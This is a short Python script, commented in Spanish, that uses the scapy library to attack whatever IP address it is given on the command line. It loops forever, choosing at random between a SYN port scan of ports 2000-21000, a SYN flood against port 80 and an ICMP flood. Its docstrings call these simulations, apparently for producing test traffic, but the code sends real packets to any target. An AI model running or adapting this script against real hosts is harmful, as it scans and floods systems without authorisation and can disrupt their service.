from scapy.all import *
import random
import time
import os
import sys

def port_scan(target):
    """Simula Port Scanning"""
    print(f"Iniciando Port Scan contra {target}...")
    for port in range(2000, 21000):
        send(IP(dst=target)/TCP(dport=port, flags="S"), verbose=0)

def syn_flood(target):
    """Simula SYN Flood"""
    print(f"Iniciando SYN Flood contra {target}...")
    for _ in range(150):
        sport = random.randint(1024, 65535)
        send(IP(dst=target)/TCP(sport=sport, dport=80, flags="S"), verbose=0)

def icmp_flood(target):
    """Simula ICMP Flood"""
    print(f"Iniciando ICMP Flood contra {target}...")
    for _ in range(600):
        send(IP(dst=target)/ICMP(), verbose=0)

def main(target):
    print(f"Configurado para atacar: {target}")
    
    while True:
        attack = random.choice(["port_scan", "syn_flood", "icmp_flood"])
        
        if attack == "port_scan":
            port_scan(target)
        elif attack == "syn_flood":
            syn_flood(target)
        else:
            icmp_flood(target)
            
        time.sleep(random.randint(1, 5))

if __name__ == "__main__":
    main(sys.argv[1])